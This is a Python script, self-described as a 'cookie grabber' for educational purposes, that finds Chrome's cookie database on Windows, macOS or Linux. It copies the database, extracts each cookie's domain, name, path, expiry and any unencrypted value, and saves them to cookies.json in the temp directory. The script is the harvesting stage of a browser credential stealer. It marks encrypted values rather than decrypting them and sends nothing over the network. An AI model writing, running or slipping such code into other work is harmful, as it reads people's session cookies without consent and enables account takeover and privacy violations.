import os
import tempfile
import json
import sqlite3
import shutil
import platform

def get_chrome_cookies_path():
    """Determine the path to Chrome's cookies database based on the operating system."""
    user_home = os.path.expanduser("~")
    system = platform.system()
    
    if system == "Windows":
        return os.path.join(user_home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
    elif system == "Darwin":  # macOS
        return os.path.join(user_home, "Library", "Application Support", "Google", "Chrome", "Default", "Cookies")
    elif system == "Linux":
        return os.path.join(user_home, ".config", "google-chrome", "Default", "Cookies")
    else:
        raise Exception("Unsupported operating system")

def grab_cookies():
    """Grabs Chrome browser cookies and saves them to a JSON file (educational purposes only)."""
    try:
        # Get the path to Chrome's cookies database
        cookies_db_path = get_chrome_cookies_path()
        
        # Create a temporary file for the database copy
        temp_db_fd, temp_db_path = tempfile.mkstemp(suffix=".sqlite")
        os.close(temp_db_fd)
        
        # Copy the cookies database to avoid access issues
        shutil.copy(cookies_db_path, temp_db_path)
        
        # Connect to the temporary database
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        # Query cookies, marking encrypted values
        cursor.execute("""
            SELECT host_key, name, 
                   CASE WHEN length(encrypted_value) > 0 THEN 'ENCRYPTED' ELSE value END AS cookie_value, 
                   path, expires_utc 
            FROM cookies
        """)
        cookies = []
        for row in cursor.fetchall():
            # Convert expires_utc (microseconds since Windows epoch) to Unix timestamp (seconds)
            expires = int((row[4] / 1000000) - 11644473600) if row[4] > 0 else 0
            cookies.append({
                "domain": row[0],
                "name": row[1],
                "value": row[2],
                "path": row[3],
                "expires": expires
            })
        
        # Close the database connection
        conn.close()
        
        # Define the output JSON file path
        temp_json_path = os.path.join(tempfile.gettempdir(), "cookies.json")
        
        # Write cookies to the JSON file
        with open(temp_json_path, "w") as f:
            json.dump(cookies, f, indent=2)
        
        # Clean up the temporary database file
        os.remove(temp_db_path)
        
        return temp_json_path
    except Exception as e:
        print(f"Cookie grabber error: {e}")
        return None

# Example usage
if __name__ == "__main__":
    result = grab_cookies()
    if result:
        print(f"Cookies saved to: {result}")